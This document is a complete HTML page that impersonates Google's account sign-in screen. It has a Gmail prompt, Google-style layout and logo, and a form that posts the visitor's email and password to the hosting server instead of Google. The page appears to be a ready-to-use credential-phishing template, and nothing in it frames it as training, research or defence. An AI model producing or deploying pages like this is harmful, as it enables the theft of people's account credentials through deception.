<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Arial,sans-serif}
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{width:100%;max-width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;min-height:500px}
.logo{display:block;margin:0 auto 16px;height:24px}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
.sub{font-size:16px;color:#202124;text-align:center;margin-bottom:32px}
.field{position:relative;margin-bottom:24px}
.field input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none}
.field input:focus{border:2px solid #1a73e8;padding:12px 14px}
.field label{position:absolute;left:12px;top:14px;font-size:16px;color:#5f6368;background:#fff;padding:0 4px;transition:.1s;pointer-events:none}
.field input:focus+label,.field input:not(:placeholder-shown)+label{top:-8px;font-size:12px;color:#1a73e8}
.forgot{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;display:inline-block;margin-bottom:40px}
.bottom{display:flex;justify-content:space-between;align-items:center}
.create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}
.next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}
.next:hover{background:#1b66c9;box-shadow:0 1px 2px rgba(0,0,0,.3)}
@media(max-width:480px){.card{border:none;padding:24px}}
</style>
</head>
<body>
<div class="card">
<svg class="logo" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><g fill="none"><path fill="#4285F4" d="M23.5 10.1v8.6h-2.9V2.5h7.6c2.2 0 3.9 1.7 3.9 3.8s-1.7 3.8-3.9 3.8h-4.7zm0-2.4h4.6c.8 0 1.5-.6 1.5-1.4s-.7-1.4-1.5-1.4h-4.6v2.8zM37 18.7c-2.4 0-4.4-1.9-4.4-4.3s2-4.3 4.4-4.3 4.4 1.9 4.4 4.3-2 4.3-4.4 4.3zm0-2.4c1 0 1.8-.8 1.8-1.9s-.8-1.9-1.8-1.9-1.8.8-1.8 1.9.8 1.9 1.8 1.9zM47 18.7c-2.4 0-4.4-1.9-4.4-4.3s2-4.3 4.4-4.3 4.4 1.9 4.4 4.3-2 4.3-4.4 4.3zm0-2.4c1 0 1.8-.8 1.8-1.9s-.8-1.9-1.8-1.9-1.8.8-1.8 1.9.8 1.9 1.8 1.9zM59.8 10.4v4c0 3.1-1.8 4.5-4 4.5-2.1 0-3.3-1.4-3.8-2.6l2.5-1c.2.6.8 1.2 1.4 1.2.9 0 1.5-.6 1.5-1.8v-.6h-.1c-.4.5-1 .9-1.8.9-1.9 0-3.5-1.7-3.5-4s1.6-4 3.5-4c.8 0 1.4.4 1.8.9h.1v-.8h2.4zm-5.2.6c0 1 .7 1.8 1.5 1.8s1.5-.8 1.5-1.8-.7-1.8-1.5-1.8-1.5.8-1.5 1.8zM63.2 2.5v16.2h-2.9V2.5h2.9zM68.3 16.3c1 0 1.8-.7 2-1.6l2.6 1.1c-.7 1.7-2.3 2.9-4.6 2.9-2.7 0-4.5-1.9-4.5-4.3s1.8-4.3 4.3-4.3c2.6 0 3.9 2 3.9 4.4v.4l-6.3 2.6c.4.7 1.2 1.2 2.6 1.2v-2.4zm-.3-3.8c-.8 0-1.5.6-1.7 1.4l3.3-1.4c-.1 0-.8 0-1.6 0z"/></g></svg>
<h1>Sign in</h1>
<p class="sub">to continue to Gmail</p>
<form method="POST" action="/">
<div class="field">
<input type="text" name="email" id="email" placeholder=" " required autocomplete="username">
<label for="email">Email or phone</label>
</div>
<div class="field">
<input type="password" name="password" id="password" placeholder=" " required autocomplete="current-password">
<label for="password">Enter your password</label>
</div>
<a class="forgot" href="#">Forgot password?</a>
<div class="bottom">
<a class="create" href="#">Create account</a>
<button class="next" type="submit">Next</button>
</div>
</form>
</div>
</body>
</html>
